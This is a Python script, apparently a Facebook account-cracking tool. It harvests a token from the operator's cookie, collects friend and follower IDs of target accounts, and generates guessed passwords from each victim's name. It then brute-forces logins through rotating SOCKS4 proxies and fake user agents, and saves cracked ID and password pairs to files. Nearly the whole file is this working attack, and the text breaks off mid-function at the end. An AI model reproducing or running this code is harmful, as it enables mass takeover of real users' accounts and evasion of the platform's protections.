#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('ua.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/NAZRI-XD23/CRACK-IG/blob/main/ua.txt').text
		ua=open('ua.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('ua.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f'''\t{asu}
    dMMMMb  dMMMMb  .aMMMb  dMP dMP        .aMMMMP .aMMMb  dMMMMb dMMMMMP 
   dMP.dMP dMP.dMP dMP"dMP dMK.dMP        dMP"    dMP"dMP dMP VMP  .dMP"  
  dMMMMP" dMMMMK" dMP dMP .dMMMK"        dMP MMP"dMP dMP dMP dMP .dMP"    
 dMP     dMP"AMF dMP.aMP dMP"AMF        dMP.dMP dMP.aMP dMP.aMP.dMP"      
dMP     dMP dMP  VMMMP" dMP dMP         VMMMP"  VMMMP" dMMMMP"dMMMMMP     

    {m}{k}{h}{sir} K MA HANCY HAINA RA PARAAA MYAKASSAM😻😻 {x}{m}{k}{h}{x}                                                                      
    {m}{k}{h}{sir} AUTHOR : PRESHAK {x}{m}{k}{h}{x}''')
    
    #---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r----->%s  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r----->%s Your Expired Apps    :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(57*'-')
 
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			os.popen('/sdcard/hacker.mp3')
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			os.popen('/sdcard/hacker.mp3')
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t� EXTENSION FOR COOKIES : [green]Cookiedough[white]�'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Input Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "mozilla/5.0 (linux; android 6.0; mito a990 build/ad198_a_bp307) applewebkit/537.36 (khtml, like gecko) chrome/67.0.3396.81 mobile safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}{h} INCORRECT COOKIE OR CP ID{x} ')
		os .system ('xdg-open https://www.facebook.com/100037755396637/posts/pfbid0tT5bzmJwRSRH1sWm9eHhaTQDEmJ9gNFxZyu5W2n9V9up3E29Q31rLhDGn37mRp3l/?app=fbl');#line:52
		print(f'  {x}{h} LOGIN SUCCESSFUL PLEASE RERUN THE CODE AGAIN{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		os.popen('/sdcard/hacker.mp3')
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Incorrect')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('\tWELCOME [green]%s[white] NAMASTE'%(my_name)))
	print(">> SAAB BOLO PRESHAK HANCYY KI JAY")
	alvino_xy(f'>> USER ID : '+str(my_id))
	alvino_xy(f'>> USER IP : {ip}')
	print("===================================================")
	print('')
	print("===================================================")
	print('\x1b[38;5;231m[1] \x1b[1;96mCRACK PUBLIC ID ')
	print('\x1b[38;5;231m[2] \x1b[1;96mCRACK FOLLOWERS')
	print('\x1b[38;5;231m[3] \x1b[1;96mREPORT BUG ')
	print('\x1b[38;5;231m[4] \x1b[1;96mCRACK FILE')
	print('\x1b[38;5;231m[5] \x1b[1;96mCHECK IDS CRACKED')
	print('\x1b[38;5;231m[6] \x1b[1;96mCREATE FILE UNLIMITED')
	print('\x1b[38;5;231m[7] \x1b[1;96mRANDOM IDS')
	print('\x1b[38;5;196m[0] \x1b[38;5;196mEXIT      ')
	print("===================================================")
	_____IKFAR__IFC_____ = input('\x1b[38;5;196m=\x1b[38;5;231m=\x1b[38;5;44m=> \x1b[38;5;231mInput :')
	if _____IKFAR__IFC_____ in ['1']:
		dump_massal()
	elif _____IKFAR__IFC_____ in ['2']:
		dump_pengikut()
	elif _____IKFAR__IFC_____ in ['3']:
		laporkan()
	elif _____IKFAR__IFC_____ in ['4']:
		crack_file()
	elif _____IKFAR__IFC_____ in ['5']:
		result()
	elif _____IKFAR__IFC_____ in ['6']:
		os.system("python kkk.py")
	elif _____IKFAR__IFC_____ in ['7']:
		os.system("python /sdcard/Samsung/run.py")
	elif _____IKFAR__IFC_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> PARAAAA MYAKASSAM ')
		exit()
	else:
		print('╰─> Correct Input  ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
	
#-----------------[CLASS SORT]--------------------#
class sort:
	def __init__(self):
		print(47*'-')
		print ("[*] Example : 1000 ,10000, 100079 , 100080")
		print(47*'-')
		link = input ("[?] Link 1 : ")
		link1 = input ("[?] Link 2 : ")
		os.system('cat /sdcard/allinone.txt | grep "'+link+'" > /sdcard/1.txt')
		os.system('cat /sdcard/allinone.txt | grep "'+link1+'" >> /sdcard/1.txt')
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/XAking.txt')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/allinone.txt.txt')
		os.system('rm -rf /sdcard/akingidz.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("\n[] Dumping and Sliced successfully ..")
		print ("[] Your file path : /storage/emulated/0/XAking.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python ifcv2.py")

#------------------[DUMP UN]-------------------------#
class dump_ulti:
	def __init__(self):
		try:
			token = open(".token.txt", "r").read()
			cok = open(".cok.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed  ");time.sleep(2)
		idt = input("Enter link  or Target Username : " )
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Name Not Found  ")
		except Exception as e:print(" ID "+C+idt+Q+" Not Found  ");time.sleep(2);dump_ulti()
		print("Name   : "+nama+"\n")
		if nama == "Name Not Found  ":
			time.sleep(2);dump_ulti()
		os.system("rm -rf /storage/emulated/0/allinone.txt")
		namq = ("allinone")
		if namq == "" or namq == " ":
			namq = uuid.uuid4().hex[:10].upper()
		dump = open('.janganedit','w') 
		try:
			dump = open('.janganedit','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"|"+nama)
				dump.write(uid+'|'+nama+'\n')
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:print("Possible ID "+idt+" Not Public  ");time.sleep(2);exit()
		else:
			print("Total ID : %s"%(len(id)))
			dumppp = open('/sdcard/'+namq+'.json','w')
			print('File Dump Not Found : '+'/sdcard/'+namq+'.txt')
			print("Enter CTRL + Z  STOP Programe  ")
			with kikygtg(max_workers=20) as (kiky_gtg):
				juma = open(".janganedit","r").readlines()
				for data in juma:
					data = data.replace("\n","")
					kiky = data.split("|")
					mal = ("%s"%(kiky[0]))
					nm = ("%s"%(kiky[1]))
					kiky_gtg.submit(lonte__, mal, toket, token, namq)
			sort()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('╰─> [01] Your OK result ')
	print('╰─> [02] Your CP Results ')
	print('╰─> [00] EXIT	')
	kz = input('\n>> Input : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Input : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Correct Input Dick ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Clik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Input : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Input Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}UserAgent : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Input Yang Bener Kontol ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	os.system("clear")
	banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f'╰─> {x}[{h}•{x}]{h} FOLLOW OWNER ID!!!!{x} ')
		print("===================================================")
		os .system ('xdg-open https://www.facebook.com/PR3SH4KBAUF33LTH3POW3R');#line:52
		jum = int(input('➣> HOW MANY IDS DO YOU WANNA ADD? : '))
		print("===================================================")
	except ValueError:
		print('[➣] Input Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('[➣] ENTER VALUE LESS THAN 100  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('╰─> ENTER ID '+str(yz)+' : ')
		print("===================================================")
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
					ken=open("DUMP.txt", "w").write(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('➣ Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print("===================================================")
		print(f'➣ TOTAL ID TO CRACK= {h}'+str(len(id)))
		print("===================================================")
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('➣ CHECK YOUR INTERNET ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} ID IS NOT PUBLIC {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print("===================================================")
	print('>> TYPE (ME) IF YOU WANNA CRACK YOUR OWN ID ')
	print("===================================================")
	pil = input('➣ ENTER ID: ')
	print("===================================================")
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'➣ Total Id :{h} '+str(len(id)))
		print("===================================================")
		setting()
	except requests.exceptions.ConnectionError:
		print('➣NO INTERNET ')
		exit()
	except (KeyError,IOError):
		print('➣ ID IS NOT PUBLIC OR NOT FOUND ')
		print("===================================================")
		exit()
#------------------[ CRACK-GRUP ]-----------------#
def laporkan():
       print (f"╰─>{H}[{P}!{H}]{P} FOLLOW OWNER AND MSG ABOUT THE BUG OR THE THING YOU WANT TO BE IN COMMAND");time .sleep (3 );
       os .system ('xdg-open https://www.facebook.com/PR3SH4KBAUF33LTH3POW3R');back ()#line:52
       back()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	o = input('ENTER THE FILE NAME : ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('� File Not Found')
		time.sleep(2)
		exit()
	for xid in lin:
		id.append(xid)
	setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}╰─> 1. Old Account ({K}Not Too Recommended{K}{x}){x}')
	print(f'╰─> 2. New Account ({H}Recommended{H}{x}){x}')
	print(f'╰─> 3. Random Account ({H}Recommended{H}{x}){x}')
	print("===================================================")
	print('')
	hu = input('➣ Input : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('➣ Choose the Right Option ')
		exit()
	cetak(nel('[cyan][white]╰─> 1. Method 1 [Recommended]'))
	cetak(nel('[cyan][white]╰─> 2. Method 2 [SHOW APPS -ON TEST]'))
	#cetak(nel('[cyan][white]╰─> 3. Mbasic [Recommended] '))
	#cetak(nel('[cyan][white]╰─> 4. Touch  '))
	#cetak(nel('[cyan][white]╰─> 5. Mtouch '))
	print('')
	hc = input('➣ Input : ')
	if hc in ['1','01']:
		method.append('mobile')
	#elif hc in ['5','05']:
		#method.append('free')
	elif hc in ['2','02']:
		method.append('mobilev2')
	#elif hc in ['4','04']:
		#method.append('touch')
	#elif hc in ['3','03']:
		#method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	#guw = '# LIHATKAN APLIKASI TERKAIT {y/t}'
	#sol().print(mark(guw, style='red'))
		#taplikasi.append('y')
	#else:
		#taplikasi.append('t')
	guw = '# ADD PASSWORD MANUAL {y/t}'
	sol().print(mark(guw, style='white'))
	pwplus = input(N+'['+M+'➣'+N+'] Type Options : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Enter an additional password of at least 6 characters\n[[cyan]•[white]] EXAMPLE:[green] sayang,bagong,anjing,123456[white] '))
		pwku=input(N+'['+M+'➣'+N+'] Enter Additional Password: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	print(f'╰─> ID {h}OK{x} Saved in : {h}OK/%s {x}'%(okc))
	print(f'╰─> ID {k}CP{x} Saved in : {k}CP/%s {x}'%(cpc))
	print(f'╰─> FILE SAVED IN : DUMP.txt')
	print(f'[✈] ON/OFF Aeroplane Mod {m}every 5{x} \minutes')
	print("===========================================")
	with tred(max_workers=35) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1111')
					pwv.append(frs+'@123')
					pwv.append(frs+'@12')
					pwv.append(frs+'@@')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@12345')
					pwv.append(frs+'@123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1111')
					pwv.append(frs+'@123')
					pwv.append(frs+'@12')
					pwv.append(frs+'@@')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@12345')
					pwv.append(frs+'@123456')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			#elif 'free' in method:
				#pool.submit(crackfree,idf,pwv)
			#elif 'touch' in method:
				#pool.submit(cracktouch,idf,pwv)
			#elif 'mbasic' in method:
				#pool.submit(crackmbasic,idf,pwv)
				#pool.submit(crackmbasic,idf,pwv)
	print('')
	print(N+'['+M+'➣'+N+']>>> CRACK COMPLETE, DONT FORGET TO BE THANKFUL <<< ')
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Continue Cracking Back( Y/t ) ? ')
	woi = input('>> Input : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{P}[PRESHAK ]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}][{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[PRESHAK -CP] {idf}  {pw} {N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}[PRESHAK -OK] {idf}  {pw}')
				open('/sdcard/PRESHAK-OK.txt', 'a').write(idf+' | '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
